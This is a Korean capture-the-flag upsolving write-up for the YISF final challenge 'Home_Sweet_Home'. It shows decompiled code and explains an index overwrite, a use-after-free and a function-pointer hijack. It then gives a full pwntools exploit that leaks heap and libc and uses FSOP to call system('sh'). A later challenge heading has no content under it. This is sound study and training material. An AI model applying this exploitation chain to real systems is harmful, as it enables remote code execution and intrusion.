yisf 본선에 진출한 팀원에게 문제를 받아 업솔빙을 진행하였다.

1. Home_Sweet_Home
2. m2Protector_LoL
3. bad_binder

---
# Home_Sweet_Home

```bash
[*] '/mnt/d/yisf/final/home_sweet_home/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
```

PIE가 꺼져 있고 canary가 없다.

```c
__int64 sub_401389()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 0x19 && qword_404060[v1] )
  {
    printf("House address : %p\n", (const void *)qword_404060[v1]);
    printf("House data : %s\n", (const char *)qword_404060[v1]);
    ++dword_404040;
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v3; // rax
  int v5; // [rsp+Ch] [rbp-194h] BYREF
  _BYTE v6[400]; // [rsp+10h] [rbp-190h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  qword_4041A8 = (__int64)malloc(0x20uLL);
  v3 = qword_4041A8;
  *(_QWORD *)qword_4041A8 = 'naM ytiC';
  strcpy((char *)(v3 + 8), "ager");
  *(_DWORD *)(qword_4041A8 + 20) = 0;
  *(_QWORD *)(qword_4041A8 + 24) = sub_4015AC;
  puts("============================================");
  printf("Welcome to the YISF City : %p\n", v6);
  puts("============================================");
  while ( 2 )
  {
    puts("\n===== City Management =====");
    puts("1. Buy house");
    puts("2. Sell house");
    puts("3. View house");
    puts("4. Decorate house");
    puts("5. Redevelopment");
    puts("6. Exit");
    printf("> ");
    __isoc99_scanf("%d", &v5);
    switch ( v5 )
    {
      case 1:
        sub_4011F6();
        continue;
      case 2:
        sub_4012D6();
        continue;
      case 3:
        if ( !dword_404040 )
        {
          (*(void (**)(void))(qword_4041A8 + 24))();
          continue;
        }
        return 0xFFFFFFFFLL;
      case 4:
        sub_40147A();
        continue;
      case 5:
        sub_401560(v6);
        continue;
      default:
        return 0LL;
    }
  }
}
```

3번의 함수 포인터 실행에 집중하자. 현재 저장되어 있는 `sub_4015AC`은 아무 기능도 안 하지만 `sub_401389`로 바꾸면 릭을 할 수 있다.

```c
__int64 sub_4011F6()
{
  int v1; // ebx
  int v2[3]; // [rsp+Ch] [rbp-14h] BYREF

  if ( dword_4041A4 <= 25 )
  {
    printf("House size : ");
    __isoc99_scanf("%d", v2);
    v1 = dword_4041A4;
    qword_404060[v1] = malloc(v2[0]);
    dword_404140[dword_4041A4] = v2[0];
    printf("House bought at index %d\n", dword_4041A4);
    ++dword_4041A4;
    return 0LL;
  }
  else
  {
    puts("City is full!");
    return 0xFFFFFFFFLL;
  }
}
```

`create` 부분이다. 인덱스 계산을 해보면 `&dword_404140[25] == &dword_4041A4`이다. 따라서 인덱스 변조가 가능하고, 이를 음수로 변경하면 의도하지 않은 곳에 값을 쓸 수 있다. 이는 `qword_404060` 영역에 `bss` 영역의 주소를 넣어서 `qword_4041A8`를 변조하는 시나리오로 이용한다.

```c
__int64 sub_40147A()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 25 && qword_404060[v1] )
  {
    printf("Decoration : ");
    read(0, (void *)qword_404060[v1], (int)dword_404140[v1]);
    puts("House decorated!");
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}

__int64 sub_4012D6()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 0x19 && qword_404060[v1] )
  {
    free((void *)qword_404060[v1]);
    puts("House sold!");
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}
```

`edit`도 있고, `free`에서는 `UAF`도 발생한다. `edit`에서 함수 포인터를 릭 함수로 변조하고 `unsorted bin`에 있는 청크로 `heap, libc` 릭을 동시에 한 다음 `FSOP`로 마무리한다.

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    #'b *0x401796',
    #'b *0x401545',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("chall.polygl0ts.ch", 9036)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(sz : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(sz).encode())

def delete(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def read(idx : int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx : int, ctt : bytes):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

create(0x420)
create(0x100)
create(0x100)
for i in range(22):
    create(0x18)
create(-11)
create(0x4041a8-4)
create(0)
delete(0)
delete(1)
delete(2)
edit(23, p32(3) + p64(0x4041A8 - 0x10) + p64(0x401389))
read(0)
heap_base = int(p.recvline().split(b': ')[1][:-1], 16)
heap_base >>= 12
heap_base <<= 12
l.address = u64(p.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x21ace0
print(hex(heap_base))
print(hex(l.address))

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + 0x21ca70
FSOP = FSOP_struct(
	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
	lock=stdout_lock,
	_wide_data=fake_fsop_struct - 0x10,
	_markers=l.symbols["system"],
	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
	_mode=0xFFFFFFFF,
)

print(hex(fake_fsop_struct))
edit(2, p64(fake_fsop_struct ^ (heap_base >> 12)) + b'a' * 8)
create(0x100)
create(0x100)
edit(4, FSOP)

p.interactive()
```

---
# m2Protector_LoL

